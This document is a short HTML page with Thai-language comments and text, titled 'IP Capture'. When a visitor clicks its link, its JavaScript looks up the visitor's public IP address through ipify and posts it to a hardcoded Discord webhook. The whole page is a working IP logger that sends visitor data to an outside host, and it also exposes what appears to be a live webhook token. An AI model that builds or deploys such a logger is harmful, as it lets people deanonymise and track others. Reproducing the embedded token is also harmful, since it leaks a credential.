<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Capture</title>
    <script>
        // ฟังก์ชันในการดึง IP และส่งไปยัง Discord Webhook
        async function captureAndSendIp() {
            // ดึง IP จาก ipify API
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;

            // กำหนด Payload สำหรับ Discord Webhook
            const payload = {
                content: `IP ที่กดเข้ามาคือ: ${ip}`
            };

            // ส่งข้อมูล IP ไปยัง Discord Webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // แทนค่า Webhook ที่คุณต้องการ
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            // แสดงข้อความว่า IP ถูกบันทึกแล้ว
            alert("IP ถูกบันทึกและส่งไปยัง Discord Webhook เรียบร้อยแล้ว!");
        }
    </script>
</head>
<body>
    <h1>ยินดีต้อนรับ! กดลิงก์เพื่อบันทึก IP ของคุณ</h1>
    <!-- ลิงก์เมื่อคลิกจะดึง IP และส่งไปยัง Discord Webhook -->
    <a href="javascript:void(0);" onclick="captureAndSendIp()">คลิกที่นี่เพื่อบันทึก IP</a>
</body>
</html>
